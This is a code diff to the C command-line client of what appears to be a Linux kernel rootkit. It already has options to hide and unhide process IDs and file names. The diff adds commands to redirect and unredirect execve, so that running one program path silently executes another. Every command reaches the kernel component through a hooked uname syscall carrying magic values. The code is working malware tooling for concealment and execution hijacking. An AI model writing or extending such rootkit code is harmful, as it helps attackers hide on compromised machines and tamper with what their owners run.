@@ -26,8 +26,10 @@ static struct option long_options[] = {
 	{"unhide-pid", 1, 0, 6},
 	{"hide-filename", 1, 0, 7},
 	{"unhide-filename", 1, 0, 8},
-	{"debug-rk", 0, 0, 9},
-	{"debug-stats", 0, 0, 10},
+	{"redirect-execve", 1, 0, 9},
+	{"unredirect-execve", 1, 0, 10},
+	{"debug-rk", 0, 0, 11},
+	{"debug-stats", 0, 0, 12},
 	{0, 0, 0, 0}
 };
 
@@ -158,6 +160,38 @@ void unhide_filename(const char *name)
 	syscall(SYS_uname, &args);
 }
 
+void redirect_execve(char *path)
+{
+	struct rk_args args;
+	char *old_path, *new_path;
+
+	old_path = path;
+	new_path = strchr(path, ':');
+	if (!new_path)
+		return;
+	*new_path = 0;
+	new_path++;
+
+	set_magics(&args);
+	args.mode = REDIRECT_EXECVE;
+	args.p_param1 = old_path;
+	args.param2 = strlen(old_path);
+	args.p_param3 = new_path;
+	args.param4 = strlen(new_path);
+	syscall(SYS_uname, &args);
+}
+
+void unredirect_execve(char *path)
+{
+	struct rk_args args;
+
+	set_magics(&args);
+	args.mode = UNREDIRECT_EXECVE;
+	args.p_param1 = path;
+	args.param2 = strlen(path);
+	syscall(SYS_uname, &args);
+}
+
 int main(int argc, char **argv)
 {
 	int c, opt_idx;
@@ -206,10 +240,16 @@ int main(int argc, char **argv)
 			unhide_filename(optarg);
 			break;
 		case 9:
+			redirect_execve(optarg);
+			break;
+		case 10:
+			unredirect_execve(optarg);
+			break;
+		case 11:
 			args.mode = DEBUG_RK;
 			syscall(SYS_uname, &args);
 			break;
-		case 10:
+		case 12:
 			args.mode = DEBUG_STATS;
 			syscall(SYS_uname, &args);
 			break;
